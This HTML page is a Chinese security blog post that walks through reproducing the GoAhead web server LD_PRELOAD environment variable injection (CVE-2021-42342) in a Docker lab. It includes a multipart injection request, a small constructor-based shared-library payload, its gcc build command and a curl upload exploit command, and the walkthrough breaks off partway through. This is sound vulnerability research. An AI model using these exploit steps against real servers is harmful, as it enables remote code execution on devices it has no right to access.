
<!DOCTYPE html>
<html lang=en>
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="HandheldFriendly" content="True">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
  <meta name="description" content="phith0n的小站，长期存在与分享关于网络安全与各种编程的原创文章。">
  <meta name="keywords" content="phith0n,网络安全,代码审计,信息安全,漏洞挖掘,php,C++,mysql,python">
  <link rel="shortcut icon" href="../static/cactus/images/favicon.ico">
  <link rel="icon" type="image/png" href="../static/cactus/images/favicon-192x192.png" sizes="192x192">
  <link rel="apple-touch-icon" sizes="180x180" href="../static/cactus/images/apple-touch-icon.png">
  <link rel="alternate" type="application/atom+xml" href="../feed/index.rss" title="离别歌"/>

  <title>GoAhead环境变量注入复现踩坑记 | 离别歌</title>
  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/4.7.0/css/font-awesome.min.css">
  <link rel="stylesheet" href="https://cdn.staticfile.org/bootstrap/5.1.3/css/bootstrap-grid.min.css">
  <link rel="stylesheet" href="../static/cactus/css/style%EF%B9%96v=20220521.css">
  
  <link rel="stylesheet" href="../static/cactus/css/code%EF%B9%96v=20211026.css">
  <link href="https://cdn.staticfile.org/fancybox/2.1.7/css/jquery.fancybox.min.css" rel="stylesheet">

</head>
<body>



  <div class="sticky">
    <a href="#" id="menu-icon" class="menu-icon active"><i class="fa fa-bars fa-lg"></i></a>
    <div class="menu">
      <ul>
        <li><a href="../index.html">主页</a></li>
        <li><a href="javascript:history.back(-1)">返回</a></li>
      </ul>
      <br>
    </div>
    <div class="clearfix"></div>
    <div class="info" style="position: fixed">
      <span id="i-top" style="display: none">Back to top</span>
      <span id="i-share" style="display: none">Share post</span>
    </div>
    <ul class="actions">
      <li><a class="icon" href="#" id="back-top"><i
          class="fa fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();"
          onmouseout="$('#i-top').toggle();"></i></a></li>
      <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true"
                                      onmouseover="$('#i-share').toggle();"
                                      onmouseout="$('#i-share').toggle();"
                                      onclick="$('#share').toggleClass('hidden');return false;"></i></a></li>
    </ul>
    <div id="share" class="hidden">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https%3A//www.leavesongs.com/PENETRATION/goahead-en-injection-cve-2021-42342.html"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https%3A//www.leavesongs.com/PENETRATION/goahead-en-injection-cve-2021-42342.html&amp;text=GoAhead%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%E8%B8%A9%E5%9D%91%E8%AE%B0"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3A//www.leavesongs.com/PENETRATION/goahead-en-injection-cve-2021-42342.html&amp;title=GoAhead%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%E8%B8%A9%E5%9D%91%E8%AE%B0"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3A//www.leavesongs.com/PENETRATION/goahead-en-injection-cve-2021-42342.html&amp;is_video=false&amp;description=GoAhead%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%E8%B8%A9%E5%9D%91%E8%AE%B0"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=GoAhead%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%E8%B8%A9%E5%9D%91%E8%AE%B0&amp;body=Check out this article: https%3A//www.leavesongs.com/PENETRATION/goahead-en-injection-cve-2021-42342.html"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https%3A//www.leavesongs.com/PENETRATION/goahead-en-injection-cve-2021-42342.html&amp;title=GoAhead%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%E8%B8%A9%E5%9D%91%E8%AE%B0"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/goahead-en-injection-cve-2021-42342.html&amp;title=GoAhead%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%E8%B8%A9%E5%9D%91%E8%AE%B0"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/goahead-en-injection-cve-2021-42342.html&amp;title=GoAhead%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%E8%B8%A9%E5%9D%91%E8%AE%B0"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/goahead-en-injection-cve-2021-42342.html&amp;title=GoAhead%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%E8%B8%A9%E5%9D%91%E8%AE%B0"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https%3A//www.leavesongs.com/PENETRATION/goahead-en-injection-cve-2021-42342.html&amp;name=GoAhead%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5%E5%A4%8D%E7%8E%B0%E8%B8%A9%E5%9D%91%E8%AE%B0&amp;description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
</ul>
    </div>
  </div>

  <div class="container-md">
    <div class="article row justify-content-center min-height">
      <div class="col-lg-8 col-md-10 col-sm-12">
        <article itemscope itemtype="http://schema.org/BlogPosting">
          <header class="post-header">
            <h1 class="color-main h1 mb-0" itemprop="name headline">GoAhead环境变量注入复现踩坑记</h1>
            <div class="meta">
              <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
                <span itemprop="name">phithon</span>
              </span>

              <div class="postdate">
                <time datetime="2022年1月5日 23:26" itemprop="datePublished">
                  2022 一月 05 23:26
                </time>
              </div>

              <div class="article-tag">
                阅读：37040
              </div>

              
                <div class="article-tag">
                  <i class="fa fa-bookmark"></i>
                  <a class="tag-link" href="../sort/PENETRATION.html">网络安全</a>
                </div>
              

              
                <div class="article-tag">
                  <i class="fa fa-tag"></i>
                  
                    <a class="tag-link" href="../tag/LD_PRELOAD.html">LD_PRELOAD</a>,
                  
                  
                    <a class="tag-link" href="../tag/goahead.html">goahead</a>
                  
                </div>
              
            </div>
          </header>
          <div class="content" itemprop="articleBody">
            <p>昨天关注到了GoAhead的环境变量注入漏洞，主要是下面这两篇文章：</p>
<ul>
<li><a href="https://ahmed-belkahla.me/post/2-methods-rce-0-day-in-goahead-webserver-pbctf-2021/" target="_blank">PBCTF 2021 - RCE 0-Day in Goahead Webserver</a></li>
<li><a href="https://mp.weixin.qq.com/s/AS9DHeHtgqrgjTb2gzLJZg" target="_blank">CVE-2021-42342 GoAhead 远程命令执行漏洞深入分析与复现</a></li>
</ul>
<p>实际上已经是几个月前的漏洞了，但是因为这段时间漏洞管制比较严格，导致信息闭塞了不少，才进行了复现。</p>
<h2 id="_1"><a class="toclink" href="#_1">漏洞原理</a></h2>
<p>GoAhead曾经出现过一次环境变量注入漏洞，建议先看下Vulhub中相关的漏洞环境与描述：<a href="https://github.com/vulhub/vulhub/tree/master/goahead/CVE-2017-17562" target="_blank">GoAhead Web Server HTTPd 'LD_PRELOAD' Remote Code Execution (CVE-2017-17562)</a>。</p>
<p>这个老漏洞的原理也很简单，就是GoAhead在处理CGI请求时，将用户传入的的参数作为环境变量了。这样，通过<code>LD_PRELOAD</code>就可以劫持CGI进程的动态链接库，进而执行任意代码。</p>
<p>今天这个漏洞实际上是对老漏洞的一次绕过，漏洞原理不是本文重点，我用两段简单的文字进行描述：</p>
<ul>
<li>补丁对用户传入参数进行了黑名单过滤，<code>LD_PRELOAD</code>这类参数不再设置为环境变量。但由于这个限制使用错了函数，导致实际上并没有生效（这就是不写单元测试的后果，但换句话说，又有多少漏洞POC是从单元测试里泄露的？）</li>
<li>补丁还将用户传入的参数名前面增加了前缀，导致无法劫持任意环境变量。但这个限制漏掉了multipart的POST包，所以攻击者通过这个方式仍然可以注入任意环境变量</li>
</ul>
<h2 id="_2"><a class="toclink" href="#_2">环境搭建</a></h2>
<p>说个趣事，GoAhead官方Embedthis曾在今年或者去年的时候把自己旗下的几个开源项目，包括GoAhead、AppWeb等直接从Github删掉了，在官网上只留了最新版源码下载，如果需要下载旧版得成为付费用户，大有转开源为闭源的趋势。但是没想到昨天重新打开Github一看，诶，项目又回来了，只不过所有的star都遗失了，有点可惜。</p>
<p>说回来，GoAhead的优点是非常轻量，编译几乎不需要额外的第三库，我们下载gcc、make等工具编译即可，我直接将Vulhub中旧版本的Dockerfile拿来改下版本号：</p>
<div class="codehilite"><pre><span></span><code><span class="k">FROM</span> <span class="s">debian:buster</span>

<span class="k">LABEL</span> <span class="nv">maintainer</span><span class="o">=</span><span class="s2">&quot;phithon &lt;root@leavesongs.com&gt;&quot;</span>

<span class="k">RUN</span> <span class="nb">set</span> -ex <span class="se">\</span>
    <span class="o">&amp;&amp;</span> apt-get update <span class="se">\</span>
    <span class="o">&amp;&amp;</span> apt-get install wget make gcc -y <span class="se">\</span>
    <span class="o">&amp;&amp;</span> wget -qO- https://github.com/embedthis/goahead/archive/refs/tags/v5.1.4.tar.gz <span class="p">|</span> tar zx --strip-components <span class="m">1</span> -C /usr/src/ <span class="se">\</span>
    <span class="o">&amp;&amp;</span> <span class="nb">cd</span> /usr/src <span class="se">\</span>
    <span class="o">&amp;&amp;</span> make <span class="se">\</span>
    <span class="o">&amp;&amp;</span> make install <span class="se">\</span>
    <span class="o">&amp;&amp;</span> cp src/self.key src/self.crt /etc/goahead/ <span class="se">\</span>
    <span class="o">&amp;&amp;</span> mkdir -p /var/www/goahead/cgi-bin/ <span class="se">\</span>
    <span class="o">&amp;&amp;</span> apt-get purge -y --auto-remove wget make gcc <span class="se">\</span>
    <span class="o">&amp;&amp;</span> <span class="nb">cd</span> /var/www/goahead <span class="se">\</span>
    <span class="o">&amp;&amp;</span> rm -rf /usr/src/ /var/lib/apt/lists/* <span class="se">\</span>
    <span class="o">&amp;&amp;</span> sed -e <span class="s1">&#39;s!^# route uri=/cgi-bin dir=cgi-bin handler=cgi$!route uri=/cgi-bin dir=/var/www/goahead handler=cgi!&#39;</span> -i /etc/goahead/route.txt

<span class="k">CMD</span> <span class="p">[</span><span class="s2">&quot;goahead&quot;</span><span class="p">,</span> <span class="s2">&quot;-v&quot;</span><span class="p">,</span> <span class="s2">&quot;--home&quot;</span><span class="p">,</span> <span class="s2">&quot;/etc/goahead&quot;</span><span class="p">,</span> <span class="s2">&quot;/var/www/goahead&quot;</span><span class="p">]</span>
</code></pre></div>

<p>另外还有一点要注意的是，今年五月份GoAhead默认将<a href="https://github.com/embedthis/goahead/commit/65afbf1e85eebd77f989f51e517dc808b5819855" target="_blank">CGI相关的配置注释了</a>。</p>
<p>这也是这个漏洞的第一个坑：<strong>新版本的GoAhead默认没有开启CGI配置，而老版本如果没有cgi-bin目录，或者里面没有cgi文件，也不受这个漏洞影响。</strong>所以并不像某些文章里说的那样影响广泛。</p>
<p>我将CGI相关的配置去掉注释并配置好，编译很顺利就通过了。此时我们就可以把这个Docker镜像跑起来：</p>
<div class="codehilite"><pre><span></span><code><span class="n">docker</span> <span class="n">run</span> <span class="o">-</span><span class="n">d</span> <span class="o">-</span><span class="n">it</span> <span class="o">--</span><span class="k">name</span> <span class="n">web</span> <span class="o">-</span><span class="n">p</span> <span class="mi">8080</span><span class="o">:</span><span class="mi">80</span> <span class="o">-</span><span class="n">v</span> <span class="n n-Quoted">`pwd`</span><span class="o">:/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">goahead</span><span class="o">/</span><span class="n">cgi</span><span class="o">-</span><span class="n">bin</span> <span class="n">vulhub</span><span class="o">/</span><span class="n">goahead</span><span class="o">:</span><span class="mf">5.1.4</span>
</code></pre></div>

<p>然后我们再在当前目录下增加一个cgi文件，比如test，并增加执行权限：</p>
<div class="codehilite"><pre><span></span><code><span class="ch">#!/bin/bash</span>

<span class="nb">echo</span> -e <span class="s2">&quot;Content-Type: text/plain\n&quot;</span>
env
</code></pre></div>

<p>访问输出当前的env，说明成功部署并解析完成了：</p>
<p><a href="../media/attachment/2022/01/05/255a7e72-f69e-48b4-87bd-8c386227a0a6.png"><img alt="image.png" src="../media/attachment/2022/01/05/255a7e72-f69e-48b4-87bd-8c386227a0a6.0733a60a09fd.png" /></a></p>
<p>但是我后文会讲，这样搭建的环境实际上是有坑的。</p>
<h2 id="_3"><a class="toclink" href="#_3">漏洞复现</a></h2>
<p>首先我们来尝试看是否可以注入环境变量。从原理上来看，实际上就是发送一个multipart数据包，就可以通过表单来注入环境变量，所以我们尝试发送如下数据包：</p>
<div class="codehilite"><pre><span></span><code><span class="nf">POST</span> <span class="nn">/cgi-bin/test</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">192.168.1.112:8080</span>
<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
<span class="na">Accept</span><span class="o">:</span> <span class="l">*/*</span>
<span class="na">Accept-Language</span><span class="o">:</span> <span class="l">en</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">multipart/form-data; boundary=----WebKitFormBoundarylNDKbe0ngCGdEiPM</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">145</span>

------WebKitFormBoundarylNDKbe0ngCGdEiPM
Content-Disposition: form-data; name=&quot;LD_PRELOAD&quot;

test
------WebKitFormBoundarylNDKbe0ngCGdEiPM--
</code></pre></div>

<p>可见，环境变量<code>LD_PRELOAD</code>注入成功了，漏洞确实存在：</p>
<p><a href="../media/attachment/2022/01/05/1853aa09-0743-4fe5-a7bb-ff98c1b21562.png"><img alt="image.png" src="../media/attachment/2022/01/05/1853aa09-0743-4fe5-a7bb-ff98c1b21562.c472774cfcd9.png" /></a></p>
<p>到这一步一切比较顺利。</p>
<h2 id="_4"><a class="toclink" href="#_4">漏洞利用</a></h2>
<h3 id="_5"><a class="toclink" href="#_5">文件上传目录配置</a></h3>
<p>注入环境变量的目的当然是利用漏洞，做到任意代码执行。但是我们看老的漏洞CVE-2017-17562，当时是将<code>LD_PRELOAD</code>设置成标准输入，即<code>LD_PRELOAD=/proc/self/fd/0</code>。因为在CGI中POST Body就是标准输入，所以正好可以将劫持的so文件放在Body中发送，完成利用。</p>
<p>但这次我们需要在Body中发送multipart表单，自然不能再用这种方法。</p>
<p>我们的目的是在服务器上上传一个可控内容的文件，然后将环境变量<code>LD_PRELOAD</code>设置为这个文件的路径，这样来劫持动态链接库。很容易想到另一个方法就是通过上传文件的形式来创建文件。</p>
<p>和PHP一样，GoAhead在遇到上传表单的时候，会先将这个上传的文件保存在一个临时目录下，待脚本程序处理完成后删掉这个临时文件。</p>
<p>我们尝试发送一个文件上传数据包：</p>
<p><a href="../media/attachment/2022/01/05/8f7ddb1d-4aa4-46de-bc6e-c746543ca3da.png"><img alt="image.png" src="../media/attachment/2022/01/05/8f7ddb1d-4aa4-46de-bc6e-c746543ca3da.fceb867aad0a.png" /></a></p>
<p>但发现直接爆500了，查看日志，错误信息是：</p>
<div class="codehilite"><pre><span></span><code><span class="n">goahead</span><span class="p">:</span> <span class="mi">2</span><span class="p">:</span> <span class="n">POST</span> <span class="o">/</span><span class="n">cgi</span><span class="o">-</span><span class="n">bin</span><span class="o">/</span><span class="n">test</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
<span class="n">goahead</span><span class="p">:</span> <span class="mi">2</span><span class="p">:</span> <span class="n">Cannot</span> <span class="n">open</span> <span class="n">upload</span> <span class="n">temp</span> <span class="n">file</span> <span class="n">tmp</span><span class="o">/</span><span class="n">tmp</span><span class="o">-</span><span class="mf">1.</span><span class="n">tmp</span>
</code></pre></div>

<p>失败原因是无法写入临时文件<code>tmp/tmp-1.tmp</code>。我们查看GoAhead源码可以发现其中对上传目录有这样一个配置：</p>
<div class="codehilite"><pre><span></span><code><span class="cp">#ifndef ME_GOAHEAD_UPLOAD_DIR</span>
    <span class="cp">#define ME_GOAHEAD_UPLOAD_DIR &quot;tmp&quot;</span>
<span class="cp">#endif</span>

<span class="n">PUBLIC</span> <span class="kt">void</span> <span class="n">websUploadOpen</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">uploadDir</span> <span class="o">=</span> <span class="n">ME_GOAHEAD_UPLOAD_DIR</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">uploadDir</span> <span class="o">==</span> <span class="sc">&#39;\0&#39;</span><span class="p">)</span> <span class="p">{</span>
<span class="cp">#if ME_WIN_LIKE</span>
        <span class="n">uploadDir</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s">&quot;TEMP&quot;</span><span class="p">);</span>
<span class="cp">#else</span>
        <span class="n">uploadDir</span> <span class="o">=</span> <span class="s">&quot;/tmp&quot;</span><span class="p">;</span>
<span class="cp">#endif</span>
    <span class="p">}</span>
    <span class="n">trace</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="s">&quot;Upload directory is %s&quot;</span><span class="p">,</span> <span class="n">uploadDir</span><span class="p">);</span>
    <span class="n">websDefineHandler</span><span class="p">(</span><span class="s">&quot;upload&quot;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">uploadHandler</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>

<p>如果宏<code>ME_GOAHEAD_UPLOAD_DIR</code>没有定义，则将其定义为<code>tmp</code>。然后将其赋值给uploadDir，<code>ME_GOAHEAD_UPLOAD_DIR</code>一定不是空字符串，所以上传目录就是<code>tmp</code>。</p>
<p>很明显这是个相对路径，相对于的是当前目录，当前目录是在启动GoAhead的时候用<code>--home</code>参数指定的，是存放配置文件的目录，在我这里就是<code>/etc/goahead</code>。</p>
<p>也就是说，临时文件是存放在<code>/etc/goahead/tmp</code>这个目录下的，如果这个目录不存在或者不可写，那么就会出现上传时500。</p>
<p>这就是第二个坑：<strong>因为很多IOT设备并没有文件上传的需求，也就没有好好配置这个目录，导致实际上攻击者无法通过文件上传的方式向目标写入任意文件，也就无法完成攻击。</strong></p>
<p>作为开发者，我们当然可以解决这个问题，有两种方法：</p>
<ul>
<li>创建<code>/etc/goahead/tmp</code>目录并设置写权限</li>
<li>在编译GoAhead的时候指定<code>ME_GOAHEAD_UPLOAD_DIR</code>参数，修改临时目录路径</li>
</ul>
<p>我使用的第二种方法，修改Dockerfile如下：</p>
<div class="codehilite"><pre><span></span><code><span class="k">FROM</span> <span class="s">debian:buster</span>

<span class="k">LABEL</span> <span class="nv">maintainer</span><span class="o">=</span><span class="s2">&quot;phithon &lt;root@leavesongs.com&gt;&quot;</span>

<span class="k">RUN</span> <span class="nb">set</span> -ex <span class="se">\</span>
    <span class="o">&amp;&amp;</span> apt-get update <span class="se">\</span>
    <span class="o">&amp;&amp;</span> apt-get install wget make gcc -y <span class="se">\</span>
    <span class="o">&amp;&amp;</span> wget -qO- https://github.com/embedthis/goahead/archive/refs/tags/v5.1.4.tar.gz <span class="p">|</span> tar zx --strip-components <span class="m">1</span> -C /usr/src/ <span class="se">\</span>
    <span class="o">&amp;&amp;</span> <span class="nb">cd</span> /usr/src <span class="se">\</span>
    <span class="o">&amp;&amp;</span> make <span class="nv">SHOW</span><span class="o">=</span><span class="m">1</span> <span class="nv">ME_GOAHEAD_UPLOAD_DIR</span><span class="o">=</span><span class="s2">&quot;&#39;\&quot;/tmp\&quot;&#39;&quot;</span> <span class="se">\</span>
    <span class="o">&amp;&amp;</span> make install <span class="se">\</span>
    <span class="o">&amp;&amp;</span> cp src/self.key src/self.crt /etc/goahead/ <span class="se">\</span>
    <span class="o">&amp;&amp;</span> mkdir -p /var/www/goahead/cgi-bin/ <span class="se">\</span>
    <span class="o">&amp;&amp;</span> apt-get purge -y --auto-remove wget make gcc <span class="se">\</span>
    <span class="o">&amp;&amp;</span> <span class="nb">cd</span> /var/www/goahead <span class="se">\</span>
    <span class="o">&amp;&amp;</span> rm -rf /usr/src/ /var/lib/apt/lists/* <span class="se">\</span>
    <span class="o">&amp;&amp;</span> sed -e <span class="s1">&#39;s!^# route uri=/cgi-bin dir=cgi-bin handler=cgi$!route uri=/cgi-bin dir=/var/www/goahead handler=cgi!&#39;</span> -i /etc/goahead/route.txt

<span class="k">EXPOSE</span><span class="s"> 80</span>
<span class="k">CMD</span> <span class="p">[</span><span class="s2">&quot;goahead&quot;</span><span class="p">,</span> <span class="s2">&quot;-v&quot;</span><span class="p">,</span> <span class="s2">&quot;--home&quot;</span><span class="p">,</span> <span class="s2">&quot;/etc/goahead&quot;</span><span class="p">,</span> <span class="s2">&quot;/var/www/goahead&quot;</span><span class="p">]</span>
</code></pre></div>

<p>设置参数的方法是在make命令后面增加参数（这几层引号与引号的转义也是大坑，本文不细讲）：</p>
<div class="codehilite"><pre><span></span><code><span class="nv">make</span> <span class="k">SHOW</span><span class="o">=</span><span class="mi">1</span> <span class="nv">ME_GOAHEAD_UPLOAD_DIR</span><span class="o">=</span><span class="s2">&quot;</span><span class="s">&#39;\</span><span class="s2">&quot;</span><span class="o">/</span><span class="nv">tmp</span>\<span class="s2">&quot;</span><span class="s">&#39;</span><span class="s2">&quot;</span>
</code></pre></div>

<p>这时候再上传文件就不会出错了：</p>
<p><a href="../media/attachment/2022/01/05/96f09b71-7ec3-48e5-8e9b-7466288a09d2.png"><img alt="image.png" src="../media/attachment/2022/01/05/96f09b71-7ec3-48e5-8e9b-7466288a09d2.4895e89f0b66.png" /></a></p>
<h3 id="too-big"><a class="toclink" href="#too-big">Too Big</a></h3>
<p>那么，我们按照文章中的方法复现这个漏洞试试。</p>
<p>首先，本地写一个劫持<code>LD_PRELOAD</code>的动态链接库：</p>
<div class="codehilite"><pre><span></span><code><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">before_main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="n">__attribute__</span><span class="p">((</span><span class="n">constructor</span><span class="p">));</span>

<span class="k">static</span> <span class="kt">void</span> <span class="nf">before_main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;Hello: World</span><span class="se">\r\n\r\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="mi">16</span><span class="p">);</span>
    <span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;Hacked</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="mi">7</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>

<p>编译：</p>
<div class="codehilite"><pre><span></span><code>gcc -shared -fPIC ./payload.c -o payload.so
</code></pre></div>

<p>然后我们发送POST数据包：</p>
<div class="codehilite"><pre><span></span><code>curl -v -F <span class="nv">data</span><span class="o">=</span>@payload.so -F <span class="s2">&quot;LD_PRELOAD=/proc/self/fd/7&quot;</span> http://192.168.1.112:8080/cgi-bin/test
</code></pre></div>

<p>先不说能不能执行命令了，整个HTTP连接直接被切断了：</p>
<p><a href="../media/attachment/2022/01/05/7b4b1ff7-373a-4da2-91fb-6b3d0b252219.png"><img alt="image.png" src="../media/attachment/2022/01/05/7b4b1ff7-373a-4da2-91fb-6b3d0b252219.4812190282ba.png" /></a></p>
<p>我们查看日志信息，可见报了一个Too big错误：</p>
<div class="codehilite"><pre><span></span><code>web_1  | goahead: 2: POST /cgi-bin/test HTTP/1.1
web_1  | goahead: 2: Too big
</code></pre></div>

<p>这个错误信息比较粗糙，我们可以在代码里搜索一下Too big这个关键词，看看是哪里出错了：</p>
<div class="codehilite"><pre><span></span><code><span class="k">if</span> <span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="s">&quot;content-length&quot;</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">if</span> <span class="p">((</span><span class="n">wp</span><span class="o">-&gt;</span><span class="n">rxLen</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">value</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">websError</span><span class="p">(</span><span class="n">wp</span><span class="p">,</span> <span class="n">HTTP_CODE_REQUEST_TOO_LARGE</span> <span class="o">|</span> <span class="n">WEBS_CLOSE</span><span class="p">,</span> <span class="s">&quot;Invalid content length&quot;</span><span class="p">);</span>
    <span class="k">return</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">smatch</span><span class="p">(</span><span class="n">wp</span><span class="o">-&gt;</span><span class="n">method</span><span class="p">,</span> <span class="s">&quot;PUT&quot;</span><span class="p">))</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">wp</span><span class="o">-&gt;</span><span class="n">rxLen</span> <span class="o">&gt;</span> <span class="n">ME_GOAHEAD_LIMIT_PUT</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">websError</span><span class="p">(</span><span class="n">wp</span><span class="p">,</span> <span class="n">HTTP_CODE_REQUEST_TOO_LARGE</span> <span class="o">|</span> <span class="n">WEBS_CLOSE</span><span class="p">,</span> <span class="s">&quot;Too big&quot;</span><span class="p">);</span>
      <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">wp</span><span class="o">-&gt;</span><span class="n">rxLen</span> <span class="o">&gt;</span> <span class="n">ME_GOAHEAD_LIMIT_POST</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">websError</span><span class="p">(</span><span class="n">wp</span><span class="p">,</span> <span class="n">HTTP_CODE_REQUEST_TOO_LARGE</span> <span class="o">|</span> <span class="n">WEBS_CLOSE</span><span class="p">,</span> <span class="s">&quot;Too big&quot;</span><span class="p">);</span>
      <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">smatch</span><span class="p">(</span><span class="n">wp</span><span class="o">-&gt;</span><span class="n">method</span><span class="p">,</span> <span class="s">&quot;HEAD&quot;</span><span class="p">))</span> <span class="p">{</span>
    <span class="n">wp</span><span class="o">-&gt;</span><span class="n">rxRemaining</span> <span class="o">=</span> <span class="n">wp</span><span class="o">-&gt;</span><span class="n">rxLen</span><span class="p">;</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div>

<p>原来是数据包过大，超过了<code>ME_GOAHEAD_LIMIT_POST</code>的大小导致报错了。</p>
<p>我们看看<code>ME_GOAHEAD_LIMIT_POST</code>默认值是多少：</p>
<div class="codehilite"><pre><span></span><code><span class="cp">#ifndef ME_GOAHEAD_LIMIT_POST</span>
    <span class="cp">#define ME_GOAHEAD_LIMIT_POST 16384</span>
<span class="cp">#endif</span>
</code></pre></div>

<p>默认最大支持16384个字节，其实挺小的。作为开发者，我们同样可以通过在make的时候修改这个值，但是作为攻击者，只能修改我们自己的攻击载荷，让其不要”超标“。</p>
<p>这就是第三个坑：<strong>攻击时使用的动态链接库不能过大，否则可能导致服务端出错，直接断开链接。</strong></p>
<p>我们可以在gcc的时候增加<code>-s</code>参数来缩小payload体积：</p>
<div class="codehilite"><pre><span></span><code><span class="n">gcc</span> <span class="o">-</span><span class="n">s</span> <span class="o">-</span><span class="n">shared</span> <span class="o">-</span><span class="n">fPIC</span> <span class="p">.</span><span class="o">/</span><span class="n">payload</span><span class="p">.</span><span class="n">c</span> <span class="o">-</span><span class="n">o</span> <span class="n">payload</span><span class="p">.</span><span class="n">so</span>
</code></pre></div>

<p>优化过的payload只有14416字节，可以达标了。</p>
<h3 id="_6"><a class="toclink" href="#_6">找不到文件描述符</a></h3>
<p>重新使用新的payload.so发送数据包：</p>
